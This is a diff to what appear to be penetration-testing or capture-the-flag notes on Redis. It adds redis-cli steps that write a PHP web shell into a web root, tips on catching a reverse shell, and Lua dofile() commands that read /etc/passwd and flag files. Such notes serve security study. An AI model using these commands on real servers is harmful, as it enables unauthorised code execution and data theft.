@@ -41,6 +41,24 @@ flushall [ASYNC | SYNC]
 
 ## Exploitation
 
+
+[ChrisPritchard/ctf-writeups TIPS-AND-TRICKS.md](https://github.com/ChrisPritchard/ctf-writeups/blob/master/TIPS-AND-TRICKS.md) provides a nice explanation for my very sparse notes below: *"if you have access to redis (port 6379) and a handy reachable location (e.g. if you know a user and have port 22, or a website you know or can guess the dir of), the following technique (from one of redis' authors!) can work:"* [https://dl.packetstormsecurity.net/1511-exploits/redis-exec.txt](https://dl.packetstormsecurity.net/1511-exploits/redis-exec.txt)
+
+continued from [ChrisPritchard/ctf-writeups TIPS-AND-TRICKS.md](https://github.com/ChrisPritchard/ctf-writeups/blob/master/TIPS-AND-TRICKS.md):
+>For the latter method, a website, the following are the steps:
+>1. install the `redis-cli` on your attacking machine. `sudo apt install redis-tools`
+>2. connect to the server: `redis-cli -h 10.10.10.10.`
+>3. run the following commands to set and save the database:
+```
+config set dir /var/www/html
+config set dbfilename "shell.php"
+set 1 "<?php echo shell_exec($_GET['e'].' 2>&1'); ?>"
+save
+```
+>- all going well, navigate to /shell.php?e=id on the webserver and see if the username has shown up
+>- because of how mangled the file is, and the simplicity of the web shell, if you want to catch a reverse shell remember to url encode the payload you add to `?e=`
+
+
 ```sql
 eval dofile('/etc/passwd') 0 # enumerating files, with lua script dofile()
 eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0 # enumerating files, with lua script dofile()
